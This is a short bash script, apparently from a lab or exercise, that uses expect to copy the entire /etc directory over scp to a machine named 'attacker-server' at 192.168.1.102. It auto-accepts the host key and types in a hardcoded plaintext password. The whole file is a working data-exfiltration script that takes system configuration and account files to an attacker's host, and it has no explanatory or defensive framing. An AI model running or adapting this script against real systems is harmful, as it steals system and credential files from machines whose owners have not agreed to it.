#!/bin/bash

function getfile(){
        echo $1
        expect <<EOF
        spawn scp -r /etc attacker-server@192.168.1.102:/home/attacker-server/Desktop
        expect "*continue connecting (yes/no*)? " {send "yes\r"}
        expect "* password: " {send "qsefthuk\r"}
        expect "*:~$ " {send "exit\n"}
EOF
}

getfile /etc